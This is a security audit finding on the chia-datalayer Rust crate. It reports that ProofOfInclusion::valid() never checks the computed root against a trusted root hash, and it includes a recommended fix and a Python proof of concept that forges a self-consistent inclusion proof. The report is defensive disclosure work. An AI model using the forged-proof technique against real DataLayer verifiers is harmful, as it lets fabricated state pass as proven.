### Title
`ProofOfInclusion::valid()` Does Not Validate Against External Root Hash — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` contains a tautological final comparison that is always `true` when the loop completes. The method validates only the internal consistency of the proof chain but never checks the computed root against any external, trusted root hash. An attacker who can supply a serialized `ProofOfInclusion` to a verifier that calls only `proof.valid()` can forge a proof claiming any key-value pair is in a DataLayer tree, and the check will pass.

### Finding Description

`ProofOfInclusion` is a `Streamable` type fully exposed to Python via the `wheel` crate. Its `valid()` method is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash = layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← always true!
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop, `existing_hash` has been set to `calculated_hash`, which was just verified to equal `layer.combined_hash`. The last `layer.combined_hash` is exactly what `root_hash()` returns. Therefore `existing_hash == self.root_hash()` is unconditionally `true` whenever the loop exits normally. The final guard provides zero security.

The method validates only that each layer's `combined_hash` is the correct hash of the previous hash combined with `other_hash` — i.e., internal chain consistency — but it never compares the resulting root against any externally trusted value. A caller who relies solely on `proof.valid()` cannot distinguish a genuine proof from a completely fabricated one whose internal chain happens to be self-consistent.

The analog to the external report is exact: just as the ZkEvmV2 finalization accepted a state root hash chain that was internally consistent but not cross-validated against the shnarf commitment, `ProofOfInclusion::valid()` accepts a proof chain that is internally consistent but not cross-validated against any external Merkle tree root.

### Impact Explanation

An attacker who can deliver a serialized `ProofOfInclusion` to a DataLayer verifier that calls only `proof.valid()` can:

- Claim that an arbitrary key maps to an arbitrary value in a DataLayer store, with the forged proof passing validation.
- Cause a DataLayer client to accept fabricated state as proven, enabling false data availability attestations.

This matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

`ProofOfInclusion` is a first-class `Streamable` type with Python bindings. The method named `valid()` is the natural and only named validation entry point; nothing in the API or documentation signals that callers must additionally compare `proof.root_hash()` against a trusted root. The Python test suite and the fuzz harness both use `proof.valid()` as the sole check, establishing a pattern that downstream integrators will follow. Any DataLayer peer or RPC client can supply a crafted proof blob.

### Recommendation

`valid()` must accept an external trusted root hash and compare against it:

```rust
pub fn valid(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    &existing_hash == expected_root   // compare against caller-supplied root
}
```

Alternatively, keep the current signature but rename it to `is_internally_consistent()` and add a separate `valid_for_root(expected_root: &Hash) -> bool` method. Update all call sites — including the Python bindings, the fuzz target, and the test suite — to supply the trusted root.

### Proof of Concept

```python
from chia_rs.datalayer import (
    ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob, KeyId, ValueId
)
import hashlib

# Build a real tree with one entry so we have a real root
blob = MerkleBlob(blob=bytearray())
real_key   = KeyId(1)
real_value = ValueId(1)
real_hash  = bytes(range(32))
blob.insert(real_key, real_value, real_hash)
blob.calculate_lazy_hashes()
real_root = blob.get_root()   # the actual Merkle root

# Forge a proof claiming key=999 / value=999 is in the tree
fake_node_hash = hashlib.sha256(b"fake leaf").digest()
fake_other     = hashlib.sha256(b"fake sibling").digest()

# Compute combined_hash so the chain is internally consistent
combined = hashlib.sha256(b"\x02" + fake_other + fake_node_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Right
    other_hash=fake_other,
    combined_hash=combined,
)
forged_proof = ProofOfInclusion(node_hash=fake_node_hash, layers=[layer])

# valid() returns True even though forged_proof.root_hash() != real_root
assert forged_proof.valid(), "valid() accepted forged proof"
assert forged_proof.root_hash() != real_root, "root hashes differ"
print("Forged proof passes valid() but has wrong root — attack confirmed")
```
